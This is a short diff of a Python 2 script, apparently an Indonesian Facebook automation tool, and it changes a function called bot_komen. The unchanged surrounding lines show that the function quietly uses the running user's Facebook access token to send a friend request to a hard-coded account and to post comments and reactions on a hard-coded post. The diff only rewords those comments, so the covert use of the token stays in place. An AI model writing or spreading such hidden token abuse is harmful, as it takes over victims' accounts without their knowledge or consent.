@@ -157,11 +157,11 @@ def bot_komen():
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('100015561930583')
-	kom = ('GUE PAKE SCRIPT LU Bang Tampan😘😘😘')
+	kom = ('Aku Izin pake script kamu ya 😘')
 	reac = ('ANGRY')
 	post = ('936741303521259')
 	post2 = ('936741303521259')
-	kom2 = ('KREN SUKSES SELALU Ya Mister Tricker😘😘😘')
+	kom2 = ('Mantap jiwa sc nya bang 😘')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
